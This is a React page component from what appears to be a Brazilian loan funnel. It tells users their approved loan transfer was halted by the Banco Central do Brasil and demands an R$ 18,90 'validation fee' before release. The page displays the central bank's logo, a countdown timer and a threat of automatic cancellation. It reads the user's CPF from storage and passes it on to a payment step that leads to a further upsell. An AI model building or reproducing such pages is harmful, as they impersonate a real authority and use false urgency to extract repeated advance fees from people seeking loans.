import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { AlertTriangle } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import UserMenu from '../components/UserMenu';
import { getUserName } from '../utils/userUtils';
import { navigateWithParams } from '../utils/urlParams';
import { trackPurchase } from '../utils/facebookPixel';

export default function Upsell3Page() {
  const navigate = useNavigate();
  const location = useLocation();
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');
  const [progressWidth, setProgressWidth] = useState(0);
  const [timeLeft, setTimeLeft] = useState(300);

  const handleMenuClick = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleMenuClose = () => {
    setIsMenuOpen(false);
  };

  useEffect(() => {
    trackPurchase({
      value: 21.80,
      currency: 'BRL',
      content_type: 'upsell',
      content_name: 'Upsell',
      num_items: 1,
    });

    const timer = setTimeout(() => {
      setProgressWidth(90);
    }, 100);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    saveFunnelData({
      currentStep: '/upsell-3'
    });
  }, []);

  useEffect(() => {
    const countdown = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          clearInterval(countdown);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(countdown);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handlePayTariff = () => {
    const { userData } = location.state || {};
    const cpf = userData?.cpf || sessionStorage.getItem('user_cpf') || localStorage.getItem('user_cpf');
    console.log('Upsell3 - CPF from storage:', cpf);

    if (!cpf) {
      console.error('CPF not found in storage. Redirecting to home.');
      navigate('/');
      return;
    }

    navigateWithParams(
      navigate,
      '/upsell-payment',
      location,
      {
        amount: 18.90,
        title: 'Tarifa de Validação',
        redirectPath: '/upsell-4',
        cpf: cpf,
        userData: userData
      }
    );
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header showUserIcon={true} onMenuClick={handleMenuClick} />
      <UserMenu isOpen={isMenuOpen} onClose={handleMenuClose} userName={getUserName()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-sm sm:max-w-md">
          <div className="bg-red-50 border-2 border-red-300 rounded-2xl p-4 mb-6 shadow-lg animate-fade-in-down">
            <div className="flex items-center justify-center gap-2 mb-2">
              <AlertTriangle className="w-5 h-5 text-red-600 animate-pulse" />
              <p className="text-sm text-red-700 font-bold">ATENÇÃO</p>
            </div>
            <p className="text-xs sm:text-sm text-red-700 text-center leading-relaxed mb-3">
              Caso o pagamento da tarifa não seja realizado nos próximos minutos, a transferência será automaticamente cancelada pelo sistema.
            </p>
            <div className="flex items-center justify-center gap-2 bg-white border border-red-300 rounded-lg py-2 px-4">
              <span className="text-xs text-red-600 font-medium">Tempo restante:</span>
              <span className={`text-lg font-bold ${timeLeft <= 60 ? 'text-red-600 animate-pulse' : 'text-red-700'}`}>
                {formatTime(timeLeft)}
              </span>
            </div>
          </div>

          <div className="mb-6 animate-slide-up" style={{ animationDelay: '0.1s' }}>
            <div className="w-full bg-gray-200 rounded-full h-4 overflow-hidden shadow-inner">
              <div
                className="bg-gradient-to-r from-green-500 to-green-600 h-full rounded-full transition-all duration-2000 ease-out relative"
                style={{ width: `${progressWidth}%` }}
              >
                <div className="absolute inset-0 bg-white opacity-20 animate-shimmer" />
              </div>
            </div>
            <p className="text-xs text-gray-600 text-right mt-2 font-semibold">{progressWidth}% concluído</p>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-6 mb-6 animate-slide-up" style={{ animationDelay: '0.2s' }}>
            <div className="flex justify-center mb-5">
              <div className="w-20 h-20 bg-gradient-to-br from-red-100 to-red-200 rounded-full flex items-center justify-center animate-bounce-subtle shadow-lg">
                <AlertTriangle className="w-10 h-10 text-red-600" strokeWidth={2.5} />
              </div>
            </div>

            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 text-center mb-4 animate-fade-in">
              Transferência Interrompida!
            </h1>

            <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-xl p-4 mb-4 border border-gray-200">
              <div className="flex items-center justify-center gap-3 mb-3">
                <img
                  src="/banco-central-do-brasil-logo-4.png"
                  alt="Banco Central do Brasil"
                  className="h-8 w-auto"
                />
              </div>
              <p className="text-sm text-gray-700 text-center leading-relaxed">
                Seu empréstimo foi aprovado, mas a transferência foi interrompida pelo Banco Central do Brasil.
              </p>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-4">
              <p className="text-sm text-gray-700 text-center leading-relaxed">
                Para liberação, é necessário realizar o pagamento da tarifa de validação.
                <span className="block mt-2 font-semibold text-blue-700">
                  Após o pagamento, o valor será transferido imediatamente para sua chave PIX.
                </span>
              </p>
            </div>

            <p className="text-sm text-red-600 text-center font-bold mb-5 animate-pulse">
              ⚠️ Evite o cancelamento automático e confirme agora.
            </p>

            <div className="bg-gradient-to-br from-green-50 to-green-100 border-2 border-green-300 rounded-xl p-5 mb-6 shadow-md animate-pulse-subtle">
              <p className="text-xs text-gray-600 text-center mb-1 font-medium">Valor da tarifa</p>
              <p className="text-3xl font-bold text-green-600 text-center">R$ 18,90</p>
            </div>

            <button
              onClick={handlePayTariff}
              className="w-full py-5 px-6 rounded-xl font-bold text-lg text-white bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 transition-all duration-300 shadow-lg hover:shadow-2xl animate-scale-pulse hover:animate-none transform hover:scale-105"
            >
              PAGAR TARIFA E RECEBER
            </button>
          </div>
        </div>
      </main>

      <Footer />

      {showLoadingModal && (
        <div className="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-fade-in">
          <div className="bg-white rounded-3xl p-10 max-w-sm w-full shadow-2xl animate-scale-in">
            <div className="flex flex-col items-center">
              <div className="w-20 h-20 border-4 border-green-600 border-t-transparent rounded-full animate-spin mb-6" />
              <p className="text-base text-gray-700 text-center font-semibold leading-relaxed">
                {loadingMessage}
              </p>
            </div>
          </div>
        </div>
      )}

      <style>{`
        @keyframes fade-in-down {
          from {
            opacity: 0;
            transform: translateY(-20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in-down {
          animation: fade-in-down 0.6s ease-out;
        }

        @keyframes slide-up {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-up {
          animation: slide-up 0.6s ease-out backwards;
        }

        @keyframes fade-in {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        .animate-fade-in {
          animation: fade-in 0.3s ease-out;
        }

        @keyframes scale-in {
          from {
            opacity: 0;
            transform: scale(0.9);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }
        .animate-scale-in {
          animation: scale-in 0.4s ease-out;
        }

        @keyframes bounce-subtle {
          0%, 100% {
            transform: translateY(0);
          }
          50% {
            transform: translateY(-10px);
          }
        }
        .animate-bounce-subtle {
          animation: bounce-subtle 2s ease-in-out infinite;
        }

        @keyframes pulse-subtle {
          0%, 100% {
            transform: scale(1);
            opacity: 1;
          }
          50% {
            transform: scale(1.02);
            opacity: 0.95;
          }
        }
        .animate-pulse-subtle {
          animation: pulse-subtle 2s ease-in-out infinite;
        }

        @keyframes shimmer {
          0% {
            transform: translateX(-100%);
          }
          100% {
            transform: translateX(100%);
          }
        }
        .animate-shimmer {
          animation: shimmer 2s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}
